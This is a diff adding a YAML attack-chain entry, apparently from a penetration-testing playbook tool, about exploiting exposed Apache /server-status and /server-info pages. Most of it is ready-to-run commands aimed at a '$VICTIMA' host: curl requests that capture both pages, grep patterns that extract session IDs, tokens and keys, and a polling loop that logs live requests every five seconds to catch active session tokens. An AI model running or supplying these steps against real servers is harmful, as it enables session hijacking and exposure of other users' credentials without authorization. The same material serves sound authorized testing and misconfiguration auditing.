@@ -1,0 +1,37 @@
+chain_id: apache_server_status_disclosure
+title: "Apache — /server-status / /server-info disclosure"
+severity: MEDIUM
+tags: [web, apache, info-disclosure, mod_status]
+
+trigger:
+  any_of:
+    - { path_in: ["/server-status", "/server-info", "/server-status/"] }
+
+description: |
+  mod_status / mod_info exposed without an Allow filter. Hands you live
+  request URLs (often including session tokens), virtual hosts, source
+  IPs of every active connection, loaded modules, and the absolute
+  ServerRoot path — useful for downstream LFI exploitation.
+
+steps:
+  - id: 1
+    title: "Snapshot the page"
+    command: |
+      curl -s http://$VICTIMA/server-status | tee server-status.html
+      curl -s http://$VICTIMA/server-info  | tee server-info.html
+
+  - id: 2
+    title: "Pull URLs and parameters that contain auth tokens"
+    command: |
+      grep -oE 'GET [^ ]+|POST [^ ]+' server-status.html | sort -u
+      grep -oE 'sessionid=[^& ]+|token=[^& ]+|key=[^& ]+' server-status.html
+
+  - id: 3
+    title: "Refresh refresh refresh"
+    command: while sleep 5; do curl -s http://$VICTIMA/server-status >> requests.log; done
+    notes: |
+      Active session tokens often appear only briefly during a request.
+      Polling every few seconds catches them.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
